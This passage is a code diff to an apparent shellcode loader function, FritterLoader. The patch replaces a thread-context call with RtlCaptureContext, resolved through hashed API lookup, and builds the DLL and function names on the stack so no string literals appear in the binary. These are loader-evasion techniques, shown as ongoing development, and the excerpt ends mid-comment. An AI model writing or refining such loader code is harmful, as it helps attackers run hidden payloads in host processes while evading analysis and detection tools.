@@ -53,8 +53,8 @@ __declspec(code_seg(".text$a"))
 #endif
 HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
     CreateThread_t     _CreateThread;
-    GetThreadContext_t _GetThreadContext;
-    GetCurrentThread_t _GetCurrentThread;
+    typedef VOID (WINAPI *RtlCaptureContext_fn)(PCONTEXT);
+    RtlCaptureContext_fn _RtlCaptureContext;
     NtContinue_t       _NtContinue;
     GetModuleHandleA_t _GetModuleHandleA;
     ULONG64            hash;
@@ -85,14 +85,6 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
       hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.NtContinue) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _NtContinue = (NtContinue_t)xGetProcAddressByHash(inst, hash, inst->iv);
 
-      DPRINT("Resolving address of GetThreadContext");
-      hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.GetThreadContext) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetThreadContext = (GetThreadContext_t)xGetProcAddressByHash(inst, hash, inst->iv);
-
-      DPRINT("Resolving address of GetCurrentThread");
-      hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.GetCurrentThread) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
-
       // get the base address of the host process's executable
       DPRINT("Resolving address of GetModuleHandleA");
       hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.GetModuleHandleA) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
@@ -103,9 +95,31 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
       }
       host = _GetModuleHandleA(NULL);
 
-      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+      /* GetThreadContext on the currently running thread can report success
+         while returning an invalid register set. Resolve RtlCaptureContext
+         directly without changing the instance's 61-slot API layout. Build
+         both names on the stack: the packed loader contains code sections,
+         not .rdata string literals. */
+      {
+        volatile char dll_name[10];
+        volatile char capture_name[18];
+        dll_name[0]='n'; dll_name[1]='t'; dll_name[2]='d'; dll_name[3]='l';
+        dll_name[4]='l'; dll_name[5]='.'; dll_name[6]='d'; dll_name[7]='l';
+        dll_name[8]='l'; dll_name[9]=0;
+        capture_name[0]='R'; capture_name[1]='t'; capture_name[2]='l';
+        capture_name[3]='C'; capture_name[4]='a'; capture_name[5]='p';
+        capture_name[6]='t'; capture_name[7]='u'; capture_name[8]='r';
+        capture_name[9]='e'; capture_name[10]='C'; capture_name[11]='o';
+        capture_name[12]='n'; capture_name[13]='t'; capture_name[14]='e';
+        capture_name[15]='x'; capture_name[16]='t'; capture_name[17]=0;
+        hash = maru((const void*)dll_name, inst->iv) ^
+               maru((const void*)capture_name, inst->iv);
+      }
+      _RtlCaptureContext = (RtlCaptureContext_fn)xGetProcAddressByHash(inst, hash, inst->iv);
+
+      if(_NtContinue != NULL && _RtlCaptureContext != NULL) {
+        _RtlCaptureContext(&c);
         c.ContextFlags = CONTEXT_FULL;
-        _GetThreadContext(_GetCurrentThread(), &c);
         /* P3 Site B was attempted here (volatile salt-cancel into a
            mirror of inst->oep, gated on LOADER_POLY_SALT bit 4) but
            empirically failed: under some FritterLoader register-allocation
